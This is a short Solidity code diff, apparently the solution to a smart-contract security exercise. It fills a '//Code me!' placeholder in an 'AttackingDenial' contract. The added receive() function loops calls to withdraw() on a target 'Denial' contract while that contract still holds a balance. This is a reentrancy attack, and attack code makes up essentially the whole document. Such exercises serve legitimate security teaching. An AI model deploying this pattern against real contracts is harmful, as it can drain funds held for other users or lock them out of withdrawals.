@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        while (contractAddress.balance > 0) {
+            Denial denial = Denial(contractAddress);
+            denial.withdraw();
+        }
+    }
 }
